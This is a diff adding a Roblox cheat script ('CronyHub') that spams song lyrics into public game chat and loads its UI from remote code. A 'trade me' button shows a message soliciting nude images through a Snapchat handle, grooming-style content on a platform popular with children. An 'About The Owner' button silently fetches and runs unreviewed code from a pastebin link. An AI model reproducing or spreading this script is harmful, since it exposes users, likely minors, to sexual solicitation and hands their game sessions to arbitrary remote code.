@@ -1,0 +1,115 @@
+local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()
+
+local win = DiscordLib:Window("CronyHub Presents")
+
+local serv = win:Server("Sing songs via chat", "")
+
+local btns = serv:Channel("main")
+
+btns:Button("Discord Inv", function()
+    DiscordLib:Notification("Notification", "https://discord.gg/dx6R3AWAUV", "Join now!")
+    setclipboard("https://discord.gg/dx6R3AWAUV")
+end)
+
+btns:Seperator()
+
+local tgls = serv:Channel("songs")
+
+tgls:Toggle("rick roll",false, function(v)
+    getgenv().k = v
+      while wait() do
+        wait(2)
+      if not getgenv().k then break end 
+         local A_1 = "We're no strangers to lo You know the rules and so do I You know the rules and so do IA full commitment's what I'm thinking of  You wouldn't get this from any other guy"
+         local A_2 = "All"
+         local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+         Event:FireServer(A_1, A_2)      
+        wait(2)
+         local A_1 = "I just wanna tell you how I'm feeling, Gotta make you understand"
+          local A_2 = "All"
+          local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+          Event:FireServer(A_1, A_2) 
+          wait(2) 
+          local A_1 = "Never gonna give you up, Never gonna let you down, Never gonna run around and desert you,Never gonna make you cry,Never gonna say goodbye,Never gonna tell a lie and hurt you"
+          local A_2 = "All"
+          local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+          Event:FireServer(A_1, A_2)
+          wait(2) 
+          local A_1 = "We've known each other for so long Your heart's been aching, but you're too shy to say it Inside, we both know what's been going on We know the game, and we're gonna play it"
+          local A_2 = "All"
+          local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+          Event:FireServer(A_1, A_2)
+          wait(2) 
+          local A_1 = "And if you ask me how I'm feeling ,Don't tell me you're too blind to see"
+          local A_2 = "All"
+          local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+          Event:FireServer(A_1, A_2)
+          local A_1 = "Never gonna give you up, Never gonna let you down, Never gonna run around and desert you,Never gonna make you cry,Never gonna say goodbye,Never gonna tell a lie and hurt you"
+          local A_2 = "All"
+          local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+          Event:FireServer(A_1, A_2)
+          wait(2) 
+          local A_1 = "Ooh (Give you up) Ooh-ooh (Give you up) Ooh-ooh Never gonna give, never gonna give (Give you up) Ooh-ooh Never gonna give, never gonna give (Give you up)"
+          local A_2 = "All"
+          local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+          Event:FireServer(A_1, A_2)                  
+        end
+end)
+
+tgls:Toggle("neffex cold",false, function(v)
+    getgenv().k = v
+      while wait() do
+        wait(2)
+      if not getgenv().k then break end 
+         local A_1 = "Everybody knows that I'm breaking down Everybody knows I ain't fakin' now Everybody knows my heart's vacant now"
+         local A_2 = "All"
+         local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+         Event:FireServer(A_1, A_2)      
+        wait(2)
+         local A_1 = "Yeah, she hates me now, I made mistakes, but now I don't ever wanna be alone, I don't really ever feel at home On my own, in the zone That's the only way I know, feelin' low"
+          local A_2 = "All"
+          local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+          Event:FireServer(A_1, A_2) 
+          wait(2) 
+          local A_1 = "'Bout to blow back up, here I go I will never let the doubt creep in Gotta pop a couple more Aspirin I don't think I'll ever let you in"
+          local A_2 = "All"
+          local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+          Event:FireServer(A_1, A_2)
+          wait(2) 
+          local A_1 = "Easier to break it off as friends I don't really understand myself I don't really understand, need help I don't wanna be left on the shelf Couldn't even hear me if I yelled"
+          local A_2 = "All"
+          local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+          Event:FireServer(A_1, A_2)
+          wait(2) 
+          local A_1 = "It's so cold outside I'm alone, I'm alright It's so cold outside I'm alone, I'm alright"
+          local A_2 = "All"
+          local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+          Event:FireServer(A_1, A_2)
+          local A_1 = " never gona give you up never gona let you down"
+          local A_2 = "All"
+          local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+          Event:FireServer(A_1, A_2)
+          wait(2) 
+          local A_1 = "Yeah, let's go I don't wanna break down, always feel like I could break now But I never let it take me to that place now"
+          local A_2 = "All"
+          local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+          Event:FireServer(A_1, A_2) 
+          wait(2) 
+          local A_1 = ""
+          local A_2 = "All"
+          local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+          Event:FireServer(A_1, A_2)                   
+        end
+end)
+
+btns:Button("trade me ", function()
+    DiscordLib:Notification("Notification", "trade me your nude please itachi_9669 snap i give you cookie", "you my kitten now!")
+end)
+
+local aboutowner = serv:Channel("About The Owner")
+
+local aboutowner = aboutowner:Button("It opens About Owner ", function()
+    DiscordLib:Notification("Notification", "You pressed about Owner its opening wait and close this notification also about owner frame auto destroy itself after 10 sec", "Byee!")
+    wait(4)
+    loadstring(game:HttpGet("https://pastebin.com/raw/Zpgr5HGM"))()
+end)
